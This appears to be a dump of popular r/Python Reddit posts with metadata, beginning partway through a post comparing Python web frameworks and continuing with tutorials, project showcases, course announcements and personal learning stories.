Such powerful clients are great when you have to issue many API calls at once, for example for scraping web pages. Without asyncio, you would have to use threading or multiprocessing, which are harder to get right and require much more memory.

Apart from building standalone applications, aiohttp’s clients are a great supplement to any asyncio-based application that needs to issue non-blocking HTTP calls. The same is true for websockets. Since they are part of the HTTP specification, you can connect to websocket servers and easily exchange messages with them.

When it comes to servers, aiohttp gives you everything you can expect from a microframework. The features available out-of-the-box include routing, middleware, and signals. It may seem like it’s very little, but it will suffice for a web server.

“What about the remaining functionalities?” you may ask.

As far as those are concerned, you can build the rest of the functionalities using one or many asyncio-compatible libraries. You will find plenty of them using sources [like this one](https://github.com/timofurrer/awesome-asyncio).

Aiohttp is built with testing in mind. Developers who want to test an aiohttp-based application will find it extremely easy, especially with the aid of pytest.

Even though aiohttp offers satisfactory performance by default, there are a few low-hanging fruits you can pick. For example, you can install additional libraries: cchardet and aiodns. Aiohttp will detect them automatically. You can also utilize the same uvloop that powers Sanic.

Last but not least: **one definite advantage of aiohttp is that it is being actively maintained and developed.** Choosing aiohttp when you build your next application will certainly be a good call.

## Twisted

With Twisted, Python developers were able to do async programming long before it was cool. Twisted is one of the oldest and most mature Python projects around.

Originally released in 2002, Twisted predates even PEP8, so the code of the project does not follow the famous code style guide recommendations. Admittedly, this may somewhat discourage people from using it these days.

Twisted’s heart is an event-driven networking engine called reactor. It is used for scheduling and calling user-defined callbacks.

In the beginning, developers had to use explicit callbacks by defining functions and passing them around separately for cases when an operation succeeded and when it failed.

Although this technique was compelling, it could also lead to what we know from early JavaScript: callback hell. In other words, the resultant code was tough to read and analyze.

**At some point, Twisted introduced inlineCallbacks—the notation for writing asynchronous code that was as simple to read as regular, synchronous code.** This solution played very well with Python’s syntax and greatly influenced modern async toolkit from the standard library, asyncio.

The greatest advantage of this framework is that although Twisted itself is just an engine with few bundled extensions, there are many additional extensions available to expand its functionality. They allow for both low-level network programming (TCP/USP) and high, application-level work (HTTP, IMAP, SHH, etc).

**This makes Twisted a perfect choice for writing specialized services; however, it is not a good candidate for regular web applications.** Developers would have to write a lot of things on their own to get the functionality they take for granted with Django.

Twisted is being actively maintained. There is an undergoing effort to migrate all of its code to be compatible with Python 3. The core functionality was rewritten some time ago, but many third-party modules are still incompatible with newer versions of the interpreter.

This may raise some concerns whether Twisted is the best choice for new projects. On the other hand, though, it is more mature than some asyncio-based solutions. Also, Twisted has been around for quite some time now, which means it will undoubtedly be maintained at least for a good while.

## Falcon

Falcon is another microframework on our list. The goal of the Falcon project is to create a minimalist foundation for building web apps where the slightest overhead matters.

Authors of the framework claim it is a **bare-metal, bloat-free toolkit for building very fast backend code and microservices.** Plus, it is compatible with both Python 2 and 3.

A big advantage of Falcon is that it is indeed very fast. Benchmarks published on its website show an incredible advantage over mainstream solutions like Django or Flask.

The downside, though, is that **Falcon offers very little to start with.** There’s routing, middlewares, hooks—and that’s basically everything. There are no extras: no validation, no authentication, etc. It is up to the developer to extend functionality as needed.

Falcon assumes it will be used for building REST APIs that talk JSON. If that is the case, you really need literally zero configuration. You can just sit down and code.

This microframework might be an exciting proposition for implementing highly-customized services that demand the highest performance possible. Falcon is an excellent choice when you don’t want or can’t invest in asyncio-based solutions.

If you’re thinking, “Sometimes the simplest solution is the best one,” you should definitely consider Falcon.

## API Star

API Star is the new kid on the block. It is yet another microframework, but this one is compatible with Python 3 only. Which is not surprising, because it leverages type hints introduced in Python 3.5.

**API Star uses type hints as a notation for building validation schemata in a concise, declarative way.** Such a schema (called a “Type” in the framework’s terminology) can then be bound to request a handling function.

Additionally, API Star features automatically generated API docs. They are compatible with OpenAPI 3. Such docs can facilitate communication between API authors and its consumers, i.e. frontend developers. If you use the Types we’ve mentioned, they are included in the API docs.

Another outstanding feature is the dependency injection mechanism. It appears to be an alternative to middlewares, but smarter and much more powerful.

For example, you can write a so-called Component that will provide our views with a currently authenticated User. On the view level, you have to explicitly state that it will require a User instance.

The rest happens behind the scenes. API Star resolves which Components have to be executed to finally run our view with all the required information.

The advantage that automatic dependency injection has over regular middlewares is that Components do not cause any overhead for the views where they are not used.

Last but not least, API Star can also be run atop asyncio in a more traditional, synchronous, WSGI-compliant way. **This makes it probably the only popular framework in the Python world capable of doing that.**

The rest of the goodies bundled with API Star are pretty standard: optional support for templating with jinja2, routing, and event hooks.

All in all, API Star looks extremely promising. At the time of writing, it has over 4,500 stars in its GitHub repository. The repository already has a few dozen contributors, and pull requests are merged daily. Many of us at STX Next are keeping our fingers crossed for this project!

## Other Python web development frameworks

There are many more Python web frameworks out there you might find interesting and useful. Each of them focuses on a different issue, was built for distinct tasks, or has a particular history.

The first that comes to mind is **Zope2,** one of the oldest frameworks, still used mainly as part of the Plone CMS. **Zope3** (later renamed BlueBream) was created as Zope2’s successor. The framework was supposed to allow for easier creation of large applications, but hasn’t won too much popularity, mainly because of the need to master fairly complex concepts (e.g. Zope Component Architecture) very early in the learning process.

Also noteworthy is the **Google App Engine,** which allows you to run applications written in Python, among others. This platform lets you create applications in any framework compatible with WSGI. The SDK for the App Engine includes a simple framework called webapp2, and this exact approach is often used in web applications adapted to this environment.

Another interesting example is **Tornado,** developed by FriendFeed and made available by Facebook. This framework includes libraries supporting asynchronicity, so you can build applications that support multiple simultaneous connections (like long polling or WebSocket).

Other libraries similar to Tornado include **Pulsar** (async) and **Gevent** (greenlet). These libraries allow you to build any network applications (multiplayer games and chat rooms, for example). They also perform well at handling HTTP requests.

Developing applications using these frameworks and libraries is more difficult and requires you to explore some harder-to-grasp concepts. We recommend getting to them later on, as you venture deeper into the wonderful world of Python.

\----------------

This is the full list we came up with. Thanks for reading; let me know what you think!",https://www.reddit.com/r/Python/comments/cr3l7z/a_beginners_introduction_to_python_web_frameworks/,76,774
ia6s4i,[OC] How to use Selenium and Selenium webdriver manager to login to a website with Python,"Hey r/Python!

My last post was really well received so I am back again with another tutorial all about how to use Python to login to a website [https://www.youtube.com/watch?v=BZMVoYhA7KU](https://www.youtube.com/watch?v=BZMVoYhA7KU) with Selenium and simplifying the process by using Selenium webdriver manager

As always, I hope you find it useful and if you have any questions or video tutorial requests please drop me a note in the comments.",https://www.reddit.com/r/Python/comments/ia6s4i/oc_how_to_use_selenium_and_selenium_webdriver/,60,771
cltkgl,Program that paths how many clicks it takes to get from one sub to an nsfw sub,,https://gfycat.com/beautifulinformalfirefly,53,767
jkb80z,Not just for Django: the Django Girls tutorial is an excellent and hospitable Python introduction,"While the great work of [Django Girls](https://djangogirls.org/) is well known, I only recently took a good look at [their tutorial](https://tutorial.djangogirls.org/).

I really don't do much Django development, but this is so well written and welcoming, I recommend it simply as a great way to learn Python.

When first coming to Python, people often desire both an introduction to the language, and some idea of problems they might solve. This seems to provide both.

(Apologies to r/learnpython for first posting this there, but that subreddit is only for questions, I think.)",https://www.reddit.com/r/Python/comments/jkb80z/not_just_for_django_the_django_girls_tutorial_is/,45,766
hgtyo6,Flowchart Recognition,,https://i.redd.it/8tjx66i7lg751.png,35,768
lt37yu,Fedora is now 99% Python2-free,,https://fedora.portingdb.xyz/,117,769
md8qu4,My first Completed project,"I am sobbing . 

I've struggled with learning a computer language for years , I've started many projects that I've never completed , I always thought It was me and that I just wasn't cut out for it. 

to make a long story short , I recently lost my job and I've decided that I want to try and become a software developer. 

today I completed my first project , its just a simple blackjack game but it means so much to me that it runs. 

here is the link : [https://github.com/Quantsol/Simple-Blackjack-Game](https://github.com/Quantsol/Simple-Blackjack-Game) 

&#x200B;

any feedback would be helpful . Im not really sure how to make a portfolio page on github but I hope to post more projects in the future.

&#x200B;

cheers yall",https://www.reddit.com/r/Python/comments/md8qu4/my_first_completed_project/,82,764
qt3x3w,Advanced Visual Studio Code for Python Developers – Real Python,,https://realpython.com/advanced-visual-studio-code-python/,57,762
mnbrrk,[tutorial] How to host for free your Python app,"Hosting Python applications is easy, finding a completely free Python hosting service that is reliable is not. This post will show you how you can host your Python app on [Qovery](https://www.qovery.com) \- A 100% free hosting platform (no credit card required!!) used by 1800+ developers in 102 countries 🌎.

&#x200B;

With Qovery you can deploy your Python app with PostgreSQL, MySQL, and MongoDB databases for free.

*Disclaimer: I am the co-founder of Qovery.*

>I am pleased to announce that Qovery supports individual developers /  open source and non profit projects to host up to 3 applications  (database included) for free. Our business model is based on Enterprise hosting, which gives us the possibility to offer generous free plans. [Read more](https://www.qovery.com/blog/qovery-is-free-for-open-source-projects) \- In exchange we ask for product feedback - [join our Discord](https://discord.qovery.com)

You can read more about [Qovery vs. Heroku](https://docs.qovery.com/docs/getting-started/qovery-vs-other/heroku/).

## Deploy your Python app

⚠️ You need to have a Python project on Github or Gitlab that you want to deploy.

Given you have registered on to [Qovery](https://www.qovery.com) and you are logged into Qovery, follow the steps below:

* Go to Qovery, click the button “Create a new project” button in the middle of Qovery
* Give a name to your project - in my case ""Quotes""
* Add an application
* After that, click “I have an application”.

&#x200B;

[Then select \\""Github\\"" or \\""Gitlab\\"" and pick your repository - mine is \\""python-postgresql\\"".](https://preview.redd.it/2ghqxrark3s61.jpg?width=880&format=pjpg&auto=webp&s=77e8b27085031de0701efafd80cb4222df0794f9)

[Give a name to your app](https://preview.redd.it/cinic9hpk3s61.jpg?width=880&format=pjpg&auto=webp&s=4c4e62db49fbe359fbac9ffa0ba6b7dc17cc1d71)

[Select PostgreSQL](https://preview.redd.it/ihuauo2ok3s61.png?width=880&format=png&auto=webp&s=1cdb8fa49307e8d2e0014d0ae9c10ceec0cc24fa)

[Select the version of your DB and give it a friendly name](https://preview.redd.it/mvlyurqmk3s61.png?width=880&format=png&auto=webp&s=caf5e70728e95f3b09fe53415187c514d7b3a384)

[Deploy and TADA](https://preview.redd.it/gqnmhrpck3s61.png?width=2728&format=png&auto=webp&s=ca68834b85b4535d1bc4695c1dca03f34d53fd42)

## Conclusion

Hosting a project with Python should not be a hassle. Qovery got your back and provide everything that you need like free SSL, database, CDN to deploy your Python apps.

Give it a try now and leave me your feedback in the comments👇.

**⚠️ Important Note** ⚠️

If your deployment failed, don't forget to:

1. Provide a valid Dockerfile. 
2. Declare your Python app port in your `.qovery.yml`. [Read this doc](https://docs.qovery.com/docs/using-qovery/configuration/applications/#publicly-accessible)

Happy coding 🔥",https://www.reddit.com/r/Python/comments/mnbrrk/tutorial_how_to_host_for_free_your_python_app/,102,767
g6jqtb,"I made a python script that helps you to search, download movie posters and set them as folder icons. PosterPy uses the popular IMDbPY package to search movies and TMDb a.k.a The Movie Data Base API to download movie posters.",,https://i.redd.it/786b04n9fju41.gif,53,770
101p7xy,"2,000 free sign ups available for the ""Automate the Boring Stuff with Python"" online course. (Jan 2023)","UPDATE: The signs up are all used up. (Whoa, that was fast this month.) I'll release new codes on Feb 1st. But you can still see the first 15 of the 50 videos [on YouTube](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW), and the [Previews for all the videos are enabled on the course page](https://udemy.com/course/automate/).

If you want to learn to code, I've released 2,000 free sign ups for my course following my Automate the Boring Stuff with Python book (each has 1,000 sign ups, use the other one if one is sold out): 

~~https:// udemy. com/course/automate/?couponCode=JAN2023FREE~~

~~https:// udemy. com/course/automate/?couponCode=JAN2023FREE2~~

Udemy has changed their promo code and severely limited the number of sign ups I can provide each month, so only sign up if you are reasonably certain you can eventually finish the course. [The first 15 of the course's 50 videos are free on YouTube if you want to preview them.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

YOU CAN ALSO WATCH THE VIDEOS WITHOUT SIGNING UP FOR THE COURSE. All of the videos on the course webpage have ""preview"" turned on. Scroll down to find and click ""Expand All Sections"" and then click the preview link. You won't have access to the forums and other materials, but you can watch the videos.

**NOTE: Be sure to BUY the course for $0, and not sign up for Udemy's subscription plan. The subscription plan is free for the first seven days and then they charge you. It's selected by default. If you are on a laptop and can't click the BUY checkbox, try shrinking the browser window. Some have reported it works in mobile view.**

Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later.

Some people in India and South Africa get a **""The coupon has exceeded it's maximum possible redemptions""** error message. [Udemy advises that you contact their support if you have difficulty applying coupon codes, so click here to go to the contact form.](https://support.udemy.com/hc/en-us/requests/new?type=student) If you have a VPN service, try to sign up from a North American or European proxy.

**I'm also working on another Udemy course** that follows my recent book ""Beyond the Basic Stuff with Python"". So far I have [the first 15 of the planned 56 videos done. You can watch them for free on YouTube.](https://www.youtube.com/watch?v=kSrnLbioN6w&list=PL0-84-yl1fUmeV_2bBSguF_S0TVZk8wow&index=1)

Side note: My latest book, Python Programming Exercises Gently Explained is a set of 42 programming exercises for beginners [for free](https://inventwithpython.com/pythongently/) or as a [99 cent ebook](https://www.amazon.com/Python-Programming-Exercises-Gently-Explained-ebook/dp/B0BGYJ7G6T/).


**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with. Check out /r/ProgrammingBuddies",https://www.reddit.com/r/Python/comments/101p7xy/2000_free_sign_ups_available_for_the_automate_the/,65,761
ro6i49,This is how I found (and fixed) a vulnerability in Python's source code,,https://www.tldr.engineering/how-i-found-and-fixed-a-vulnerability-in-python/,25,767
t8st9l,I wrote a book on machine learning w/ python code,"Hello everyone. My name is Andrew and for several years I've been working on to make the learning path for ML easier. I wrote a manual on machine learning that everyone understands - Machine Learning Simplified Book.

The main purpose of my book is to build **an intuitive understanding** of how algorithms work through basic examples. In order to understand the presented material, it is enough to know basic mathematics and linear algebra.

After reading this book, you will know the basics of supervised learning, understand complex mathematical models, understand the entire pipeline of a typical ML project, and also be able to share your knowledge with colleagues from related industries and with technical professionals.

And for those who find the theoretical part not enough - I supplemented the book with a repository on **GitHub**, which has Python implementation of every method and algorithm that I describe in each chapter ([https://github.com/5x12/themlsbook](https://github.com/5x12/themlsbook)).

You can read the book absolutely free at the link below: -> [https://themlsbook.com](https://themlsbook.com/)

I would appreciate it if you recommend my book to those who might be interested in this topic, as well as for any feedback provided. Thanks! (attaching one of the pipelines described in the book).;

&#x200B;

https://preview.redd.it/o8r8luzelzl81.png?width=1572&format=png&auto=webp&s=08dd448e3a024cb7b28e7d5a12085f56819e26ed",https://www.reddit.com/r/Python/comments/t8st9l/i_wrote_a_book_on_machine_learning_w_python_code/,40,763
jensl9,Sentiment Analysis on Tech News,,https://i.redd.it/cz4zgvlfk8u51.gif,27,763
hl8y9n,"During lockdown, I developed an open-source python package for efficient text data analysis, it's called Texthero. Extra information in the comments.",,https://v.redd.it/goages9z3w851,50,767
di5nw6,"My Python Youtube channel just hit 10,000 subscribers - buildwithpython","Hey guys, 

A lot of you from Reddit have been part of the buildwithpython community. It's fun creating videos. Just wanna thànkyou for sticking around.

Learning new things and teaching it to other people. I finally found what I love doing. 

If someone is curious about the channel - 
youtube.com/c/buildwithpython

Or you can just search for buildwithpython on YouTube.

Just wanted to share my happiness with the community :)",https://www.reddit.com/r/Python/comments/di5nw6/my_python_youtube_channel_just_hit_10000/,45,761
g9j8mo,Advanced football (soccer) analytics: building and applying a pitch control model in Python,,https://www.youtube.com/watch?v=5X1cSehLg6s,23,765
jqc9ml,My weekend project was to write a visual sudoku solver without looking into how other ones are implemented before hand.," I started solving sudoku puzzles a couple of weeks ago and I enjoy it very much. Because I got more confident in my skills of solving it by hand I wanted to see if I could write a computer program to do it for me. Analogue to the old saying “You never really know something until you teach it to someone else”, I thought I'd teach my computer. 😊🖥️ 

&#x200B;

Demo video is here: [https://www.youtube.com/watch?v=MvDNnjlcqoY](https://www.youtube.com/watch?v=MvDNnjlcqoY)  


Code can be found here: [https://github.com/tymscar/Pygame-Sudoku-Solver](https://github.com/tymscar/Pygame-Sudoku-Solver)",https://www.reddit.com/r/Python/comments/jqc9ml/my_weekend_project_was_to_write_a_visual_sudoku/,64,758
7n1c9u,A REAL Python cheat sheet for beginners,,https://learnxinyminutes.com/docs/python3/,22,765
6wrd8t,"Nice lil’ easter egg, I suppose",,http://i.imgur.com/rbXF2yV.png,77,756
ye2sfl,Inside the team at Microsoft that helped make Python 10-60% Faster,,https://devblogs.microsoft.com/python/python-311-faster-cpython-team/,57,753
rjg2yd,pathlib instead of os. f-strings instead of .format. Are there other recent versions of older Python libraries we should consider?,,https://www.reddit.com/r/Python/comments/rjg2yd/pathlib_instead_of_os_fstrings_instead_of_format/,293,758
nu8zzr,Some AI tutoring so you can learn Python at a fast pace,"When I start learning something I want it to be fun and fast-paced so I can progress quickly!

We built an AI tutoring system ([Kikodo](https://www.kikodo.io/)) on top of small interactive exercises, so you can learn lots about programming in short spurts, whenever you have time. Each question has a code analyzer that reads your code and gives you personalized hints to improve your answer. It reviews code accuracy, quality, efficiency.

For now, we only have Python fundamentals, which can be completed in under two weeks' time! What subject would you recommend us to add next? We were thinking of Pandas.",https://www.reddit.com/r/Python/comments/nu8zzr/some_ai_tutoring_so_you_can_learn_python_at_a/,44,761
8bb6oq,Red Hat Confirms RHEL 8 Will Drop Python 2,,https://www.phoronix.com/scan.php?page=news_item&px=RHEL-8-No-Python-2,99,754
76dfoc,"40 Python Data Visualizations (plots, graphs, charts) with code",,https://python-graph-gallery.com/,24,757
eyb3de,My software muCLIar is a YouTube Automator that plays your music right from your Command-Line so that your development flow is not interrupted. Link: github.com/aayush1205/muCLIar,,https://i.redd.it/b1u1cum71re41.gif,59,747
ob0jtz,I wrote a Python program that produces random chord progressions,"The program prints out a semi-random sequence of chords based on a major or minor tonic. The progression will always have at least one occurrence of the tonic chord. The ""Jazziness"" slider determines the probability of 7th chords.

Demo video: [https://youtu.be/Pj6JNkYeW0Y](https://youtu.be/Pj6JNkYeW0Y)

This is just a silly little project I did for Tkinter practice and has probably been done many times before but if anyone is interested in the (mess of a) source code my DMs are open!

EDIT: The source code is now on Github: [https://github.com/CicadaFlight/chords-generator](https://github.com/CicadaFlight/chords-generator)",https://www.reddit.com/r/Python/comments/ob0jtz/i_wrote_a_python_program_that_produces_random/,53,746
lzrc0z,I made a simple remote controller for YouTube and Twitch with Python and Telegram,"Sometimes I watch Twitch from bed in the evening. I'm lazy and I don't wanted get out of bed for turn the volume up/down or shutdown the PC, so I made this small script for browse Twitch (and YouTube) with my smartphone. GitHub: [github.com/alessiocelentano/lazynite](https://github.com/alessiocelentano/lazynite)

&#x200B;

https://reddit.com/link/lzrc0z/video/twrm4aqs4ml61/player",https://www.reddit.com/r/Python/comments/lzrc0z/i_made_a_simple_remote_controller_for_youtube_and/,34,756
cbgpqu,Lost Phone,"Has anyone on this sub lost a phone on Alnmouth beach Northumberland? We can’t ring the contact who text the phone but there was a notification from this sub.

Edit: The phone was found on the beach between Alnmouth and Warkworth",https://www.reddit.com/r/Python/comments/cbgpqu/lost_phone/,41,754
yrldcw,MicroPython officially becomes part of the Arduino ecosystem | Arduino Blog,,https://blog.arduino.cc/2022/11/10/micropython-officially-becomes-part-of-the-arduino-ecosystem/,32,745
oc9vlj,"Thanks, and that’s coming from a 13 year old.","So, I know I’m going to get a good amount of hate from this post. But that’s okay. I’m still happy to share my gratitude.

But before I start, here’s a couple things to take into account. One, this is my alt account, since I would prefer not to have this post on my main account. Second, even though I’ve been coding for 3 years, I’m not that far ahead. I’ve been moving pretty slowly, and only work on it every Saturday for some amount of time. The rest of my week is spent working on my blog, doing school, with friends, and doing chores.

Ok, so now I’ll begin. I’ve been coding for 3 years. I started looking at Reddit about a year and a half ago, just online when I didn’t have an account. Then I made an account, and started learning a ton of this subreddit.

I already have an idea for my career, because if YOU. I can’t believe I actually can do this. I know so many people that are 35 and work at Cookout, so the fact you guys helped me find my dream career just blows my mind. 

I’m currently learning Data Science, which plan on learning Machine Learning after. I’ve learned the basics, all the way up to classes and such, as well as search algorithms to create AIs. My most recent one was an AI that solved an 8-Puzzle, using A* Search. Where did I learn about this algorithm? On this subreddit.

Now I’ve never been the best at writing, so I’m running out of ideas in what to say. But I just wanted to let you know that you just made a lost, depressed 13 year old with anxiety, go to a happy, passionate 13 year old with career ahead of him.

That’s all I have to say, so goodbye :)

Edit: Well now I have another thing to thank you for. For all the support you’ve given me. I thought I would be getting a good amount of hate, but I haven’t seen any so far! It’s really motivated me to keep practicing and work on new projects, so thanks!

Edit #2: We are officially the top post(As of 7/3/21)!!! We have over 700 upvotes and over 200 comments, thanks! And a special thanks to all these amazing Redditors giving these awards!",https://www.reddit.com/r/Python/comments/oc9vlj/thanks_and_thats_coming_from_a_13_year_old/,210,751
mwrxl4,A PlantsVsZombies game written fully in python,"This is definitely a fun python project written with the pygame library:

[https://github.com/marblexu/PythonPlantsVsZombies](https://github.com/marblexu/PythonPlantsVsZombies)

&#x200B;

https://preview.redd.it/hsihc8u3iwu61.jpg?width=1001&format=pjpg&auto=webp&s=5e1dcf9104138fa38605cab29a04c082a5c70089",https://www.reddit.com/r/Python/comments/mwrxl4/a_plantsvszombies_game_written_fully_in_python/,42,750
g2zsda,I made a perlin gif generator,,https://i.redd.it/gspm4l6xzct41.gif,42,750
9qk29c,"If you're learning requests, Marvel has a gigantic free API comprising information about all of their comics!",,https://developer.marvel.com/,34,751
oie7wg,Texas Instruments announces TI-84 Plus CE Python graphing calculator (still contains TI-Basic too),,https://education.ti.com/en/products/calculators/graphing-calculators/ti-84-plus-ce-python,110,744
mgi4op,76% Faster CPython,"It started with an idea: *""Since Python objects store their methods/fields in* ***\_\_dict\_\_****, that means that* ***dictionaries/hash tables power the entire language.*** That means that Python spends a significant portion of its time hashing data. What would happen if the hash function Python used was swapped out with a much faster one? ***Would it speed up CPython?****""*

So I set off to find out.

The first experiment I ran was to find out how many times the hash function is used within a single print(""Hello World!"") statement. **Python runs the hash function 11 times for just this one thing!**

Clearly, a faster hash function would help at least a little bit.

I chose [xxHash](https://github.com/Cyan4973/xxHash) as the ""faster"" hash function to test out since it is a single header file and is easy to compile.

I swapped out the default hash function used in the Py\_hash\_t \_Py\_HashBytes(const void \*src, Py\_ssize\_t len) function to use the xxHash function XXH64.

*The results were astounding.*

I created a [simple benchmark](https://github.com/Pebaz/cpython/blob/master/benchmark.py) (targeted at hashing performance), and ran it:

**CPython with xxHash hashing function was 62-76% faster!**

I believe the results of this experiment are worth exploring by a CPython contributor expert.

[Here is the code](https://github.com/Pebaz/cpython) for this for anyone that wants to see whether or not to try to spend the time to do this right (perhaps not using xxHash specifically for example). The only changes I made were copy-pasting the xxhash.h file into the [include directory](https://github.com/Pebaz/cpython/blob/master/Include/xxhash.h) and using the [XXH64 hashing function](https://github.com/Pebaz/cpython/blob/5de1728ca8697461d6fc3aa6bbcf656f6145acf1/Python/pyhash.c#L203) in the \_Py\_HashBytes() function.

I want to caveat the code changes by saying that I am not an expert C programmer, nor was this a serious effort, nor was the macro-benchmark by any means accurate (they never are). This was simply a proof of concept for food for thought for the experts that work on CPython every day and it may not even be useful.

**Again, I'd like to stress that this was just food for thought, and that all benchmarks are inaccurate.**

However, I hope this helps the Python community as it would be awesome to have this high of a speed boost.",https://www.reddit.com/r/Python/comments/mgi4op/76_faster_cpython/,109,753
r8fsxy,Today it clicked,"I was walking along the sidewalk yesterday thinking about how frustrated I used to get not knowing how to do the most basic programming. Then I realized that in a single day I had written a script that would have taken me months prior. 

Right then I stopped, smiled and danced a little. I found myself realizing that I had really understood the code, that I had thought logically about solutions to the problem I needed to automate, and I implemented problem solving without having to look many things up on stack overflow. 

It’s been about a year now since I’ve started my graduate research assistantship at the university. I pretty much got thrown in head first. 
The first day they handed me 80 Gigabytes of satellite data and told me to go read 18 pixels from each of the individual files. I was so discouraged but I kept on going and just put one foot in front of the other. 

I made the deadlines with code that functioned. I turned in products and accepted the criticism. I went home feeling like shit a lot and feeling discouraged. But today, I feel like it was all worth it. 

I say all of this to just be a voice of encouragement to all the new folks out there. You can do this. As Dory from the finding Nemo would say, “just keep swimming.” Keep going friends.

TLDR: Today I realized I’m much better at python than I used to be. I felt discouraged a lot as a beginner. Now, I can write a script super quick. Don’t give up, friends. Just keep swimming.",https://www.reddit.com/r/Python/comments/r8fsxy/today_it_clicked/,59,745
plvtlx,We're the core team behind the popular Python autoformatter: Black. AMA!,"Hello everyone!

I'm Richard S. aka ichard26 and I'm one of the core team responsible for psf/black ([repo](https://github.com/psf/black), [docs](https://black.readthedocs.io/en/stable)), a project dedicated to making sure your ~~car~~ code is painted black. Black is notable for its general lack of configuration and secondary focus on reducing diff noise.

This AMA will be at least (we have a sizable team of 9 folks) joined by

* [Łukasz Langa](https://github.com/ambv) \-- creator, maintainer & BDFL
* [Jelle Zijlstra](https://github.com/JelleZijlstra), /u/ucucha \-- maintainer
* [Zsolt Dollenstein](https://github.com/zsol) \-- maintainer
* [me](https://github.com/ichard26)! -- maintainer

**The official start time for the AMA will be 17:00pm UTC**, before then this post will exist to collect questions in advance. Since we live all over North America and Europe, **it's likely we'll answer questions before & after the official start time by a significant margin**.

Black allows you to write your Python code however you like, and let it handle fixing your coding style for others, making it easier to just program and avoid time hunting down where your code violates style guide rules.

I can't really comment on the early bits of the project's life as I only joined in mid-2020 so here's a quote from Łukasz Langa, both the creator and BDLF:

>At the time I was working for Facebook on their internal use of Python. There were over 20 million lines of code maintained and too much time during code review was wasted fighting over formatting. Plus different projects ended up having muuuch different coding styles, including some ex-Googlers forcing use of 2-spaced indents in their favorite projects. It was a mess.  
>  
>At first I tried adopting an existing code formatter, YAPF. \[...\] However, we couldn't make it work for our 20 million lines of code. It was very configurable but also very inconsistent because of it. \[...\]  
>  
>So I started working on my own. ""How hard can it be?"" Well, it took me 6 weeks to get to the first alpha release. When I put it out on March 14th 2018 (Pi Day!), it got 500 GitHub stars in one day, Kenneth Reitz started using it right away and tweeted about it, and soon after we got pretty big adoption.

And after a few short years, it's become the most popular autoformatter for Python. FWIW just only a few days ago Black surpassed 100 million downloads on PyPI, but Black isn't stopping anytime soon. It'll still exist painting code in layers of black paint!

If you want to see how Black would reformat your code, [you can try it online](https://black.vercel.app/) and paste your code to see how it changes.

Ask us anything! Post your questions and upvote the ones you think are the most important and should get our ~~paintbrushes~~ replies.

\~ richard ❀, on behalf of the team

\--

* [Announcement post](https://www.reddit.com/r/Python/comments/pihblq/join_us_for_an_ama_with_the_developers_of_black)
* [Code repository](https://black.now.sh/)
* [Contributing guidelines](https://black.readthedocs.io/en/latest/contributing/)
* [Chat with us on Python Discord](https://discord.gg/RtVdv86PrH)",https://www.reddit.com/r/Python/comments/plvtlx/were_the_core_team_behind_the_popular_python/,212,751
fn134k,"I built a virtual personal fitness trainer that gives you live feedback as you work out! (Python, OpenCV, PyTorch, Kivy, SocketIO)",,https://m.youtube.com/watch?feature=youtu.be&v=tZcRYcjTwWA&t=5m08s,51,743
12ahvyk,Pandas 2.0 Released,[https://pandas.pydata.org/docs/dev/whatsnew/v2.0.0.html](https://pandas.pydata.org/docs/dev/whatsnew/v2.0.0.html),https://www.reddit.com/r/Python/comments/12ahvyk/pandas_20_released/,53,745
yaqoxd,I created a script that allows you to store any file (encrypted or not) in an image using steganography,"# [Link to the repo](https://github.com/carlospuenteg/File-Injector)

This **30MB** **image** contains an **encrypted** **18.7MB** `.zip` **file** stored as **noise**.

&#x200B;

[This example image has been resized, so the file can't be recovered from it](https://preview.redd.it/mde2m847mdv91.png?width=2400&format=png&auto=webp&s=c98a1d0b06e9038d25451ed75aab4cba158e5c90)",https://www.reddit.com/r/Python/comments/yaqoxd/i_created_a_script_that_allows_you_to_store_any/,126,750
psfdnh,I used python to automate a task that would take some hours of tedious manual labor!,"Hello,

TLDR: Managed to automate something practical which is a milestone for me.

I recently found some resources I wanted to use on the net. I wanted to pull the pages to pdf or some other file type so as to have it on my kindle and just have it available offline. The issue was the resources are some 500 pages and are scripted so using wget was getting me nowhere as the content of the page wasn't being downloaded. I had previously tried querying the net for a solution to this but had at that point come up empty.

Instead I decided to use python and the pyautogui and make a script that would perform the command inputs through keyboard and mouse... aaaaaand.... it works!

I've so far managed to get through 3/5 of the resources with this. And the best thing is I don't have to do it myself.

Is it pretty? Its not ugly, but its not having an open casket funeral.

Does it work perfectly? No, I have to sit and glance over on it every few minutes to make sure it hasn't caught itself in some sort of loop driven by the existential dread of realization that this is all this program is going to do.

but does it work? YES!

And to be honest I can't be more proud of it for that reason. I've written some code that has untied my hands and is allowing me to work while it does its job. This is the first time I've been able to accomplish this in the 5 or so years I've had my on/off relationship with coding. All it took was a couple of hours of tinkering and getting things just right. Way less than if I would have to do it by hand. And I have to add that I enjoyed this as a process. Finding all the edge cases that made it not work, adapting it so it would process the commands functionally, dodging pitfalls because of differences from page to page. I mean it even uses the copy paste function of pyperclip to test text in different parts of the page to determine what it should do.

I also did it in python. Which is kind of surprising to me. Mostly because I don't really like python.

